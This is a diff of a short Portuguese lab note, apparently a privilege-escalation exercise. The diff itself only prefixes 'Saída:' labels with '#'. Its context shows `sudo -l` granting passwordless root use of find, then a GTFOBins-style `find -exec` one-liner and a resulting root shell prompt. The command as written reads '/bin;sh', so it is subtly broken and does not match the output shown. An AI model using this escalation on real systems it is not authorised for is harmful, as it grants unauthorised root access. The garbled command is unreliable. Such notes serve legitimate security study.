@@ -9,7 +9,7 @@
  
 user@debian:~$ sudo -l
 
-Saída:
+#Saída:
 
 User user may run the following commands on debian:
     (root) NOPASSWD: /usr/bin/find
@@ -22,7 +22,7 @@ User user may run the following commands on debian:
 ```bash
 find . -exec /bin;sh \; -quit  *script pronto no GTFOBins 
 
-Saída:
+#Saída:
 
 sh-4.1#
 ```
